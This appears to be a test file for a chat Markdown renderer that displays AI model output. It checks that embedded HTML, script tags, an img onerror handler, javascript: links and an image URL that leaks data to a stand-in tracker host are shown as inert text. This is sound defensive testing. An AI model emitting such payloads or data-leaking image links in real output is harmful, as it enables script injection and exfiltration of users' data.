import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { ipc } from "@/lib/ipc/client";
import { ChatMarkdown } from "./ChatMarkdown";

vi.mock("@/lib/ipc/client", () => ({ ipc: { openExternal: vi.fn() } }));

describe("ChatMarkdown", () => {
  it("renders Markdown as elements", () => {
    const { container } = render(
      <ChatMarkdown
        text={
          "# Title\n\nSome **bold**, *italic* and `code`.\n\n- one\n- [x] two\n\n1. first\n\n```\nlet x = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |\n"
        }
      />,
    );
    expect(container.querySelector("strong")).toHaveTextContent("bold");
    expect(container.querySelector("em")).toHaveTextContent("italic");
    expect(container.querySelector("ul")).toHaveTextContent("one");
    expect(screen.getByRole("checkbox", { name: "Done" })).toBeDisabled();
    expect(container.querySelector("ol")).toHaveTextContent("first");
    expect(container.querySelector("pre")).toHaveTextContent("let x = 1;");
    expect(screen.getByRole("table")).toHaveTextContent("ab12");
  });

  it("never renders HTML from the model", () => {
    const { container } = render(
      <ChatMarkdown
        text={
          'Hi <b onclick="x()">there</b>\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>'
        }
      />,
    );
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("<b onclick=");
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });

  it("shows an HTML embed as code, never as a frame (ADR-049)", () => {
    const { container } = render(
      <ChatMarkdown text={"```html embed height=200\n<b>Hi</b><script>x()</script>\n```"} />,
    );
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("pre")).toHaveTextContent("<b>Hi</b><script>x()</script>");
  });

  it("shows images as their address without loading them", () => {
    const { container } = render(
      <ChatMarkdown text="![secret chart](https://tracker.example.com/p.png?data=notes)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain(
      "[Image: secret chart · https://tracker.example.com/p.png?data=notes]",
    );
  });

  it("opens only web and email links, on click", async () => {
    const user = userEvent.setup();
    vi.mocked(ipc.openExternal).mockResolvedValue(undefined);
    render(<ChatMarkdown text="[docs](https://example.com/docs) and [bad](javascript:alert(1))" />);
    const link = screen.getByRole("button", { name: "docs" });
    expect(link).toHaveAttribute("title", "Open https://example.com/docs");
    expect(ipc.openExternal).not.toHaveBeenCalled();
    await user.click(link);
    expect(ipc.openExternal).toHaveBeenCalledWith("https://example.com/docs");
    expect(screen.queryByRole("button", { name: "bad" })).toBeNull();
    expect(screen.getByText("(javascript:alert(1))")).toBeInTheDocument();
  });
});
